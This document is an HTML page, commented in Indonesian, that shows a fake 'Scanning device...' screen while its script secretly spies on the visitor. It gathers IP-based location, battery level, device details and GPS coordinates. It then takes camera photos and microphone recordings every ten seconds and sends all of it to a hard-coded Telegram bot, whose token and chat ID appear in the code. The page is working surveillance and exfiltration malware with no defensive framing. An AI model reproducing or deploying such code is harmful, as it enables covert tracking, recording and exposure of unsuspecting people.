<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Loading system...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      background: black;
      color: lime;
      font-family: monospace;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }
    h1 {
      text-shadow: 0 0 10px lime;
    }
  </style>
</head>
<body>

<h1>Scanning device...</h1>
<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
const token = '7163723754:AAEIQk6FGjz2TsS4ELirDfIAbpaOThTAMdU';
const chat_id = '6624966395';
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');

function kirimPesan(text) {
  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id, text })
  });
}

// Ambil IP & lokasi berdasarkan IP
fetch('https://api.ipify.org?format=json')
  .then(res => res.json())
  .then(ipData => fetch('https://ipapi.co/' + ipData.ip + '/json/'))
  .then(loc => loc.json())
  .then(info => {
    const device = navigator.userAgent;
    navigator.getBattery().then(bat => {
      const status = `
== DETEKSI TARGET ==
IP: ${info.ip}
Negara: ${info.country_name}
Region: ${info.region}
Kota: ${info.city}
ISP: ${info.org}
Baterai: ${Math.floor(bat.level * 100)}%
Device: ${device}
=====================`;
      kirimPesan(status);
    });
  });

// Ambil lokasi GPS (jika user izinkan)
if ("geolocation" in navigator) {
  navigator.geolocation.getCurrentPosition(pos => {
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;
    const lokasi = `Lokasi GPS:\nhttps://www.google.com/maps?q=${lat},${lon}`;
    kirimPesan(lokasi);
  });
}

// Kamera + Mic + Rekaman Otomatis
navigator.mediaDevices.getUserMedia({ video: true, audio: true })
.then(stream => {
  video.srcObject = stream;
  video.play();

  setInterval(() => {
    ambilFoto();
    rekamAudio(stream);
  }, 10000); // tiap 10 detik
})
.catch(err => {
  kirimPesan("Gagal akses media: " + err);
});

function ambilFoto() {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  canvas.toBlob(blob => {
    let form = new FormData();
    form.append('chat_id', chat_id);
    form.append('photo', blob, 'foto.jpg');
    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
      method: 'POST',
      body: form
    });
  }, 'image/jpeg');
}

function rekamAudio(stream) {
  const recorder = new MediaRecorder(stream);
  let chunks = [];
  recorder.ondataavailable = e => chunks.push(e.data);
  recorder.onstop = () => {
    const blob = new Blob(chunks, { type: 'audio/webm' });
    let form = new FormData();
    form.append('chat_id', chat_id);
    form.append('audio', blob, 'rekaman.webm');
    fetch(`https://api.telegram.org/bot${token}/sendAudio`, {
      method: 'POST',
      body: form
    });
  };
  recorder.start();
  setTimeout(() => recorder.stop(), 5000);
}
</script>

</body>
</html>
